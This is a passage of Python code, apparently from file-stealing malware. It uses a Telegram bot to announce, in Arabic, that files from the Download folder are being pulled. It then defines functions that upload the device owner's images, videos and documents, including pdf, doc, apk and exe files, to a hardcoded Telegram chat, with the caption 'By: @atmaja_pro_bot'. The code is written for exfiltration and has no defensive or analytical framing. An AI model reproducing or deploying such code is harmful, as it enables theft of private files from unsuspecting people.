...
bot.send_message(chat_id=5785631502, text= 'جاري سحب ملفات مجلد Download 😜🔥')
def send_file1(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
            bot.send_photo(chat_id=5785631502, photo=f, caption='By: @atmaja_pro_bot')


def send_file2(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".mp4")):
            bot.send_video(chat_id=5785631502, video=f, caption='By: @atmaja_pro_bot')

def send_file3(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".pdf", ".pat", ".doc", ".py", ".apk", ".exe", ".cpp", ".text")):
            bot.send_document(chat_id=5785631502, document=f, caption='By: @atmaja_pro_bot')
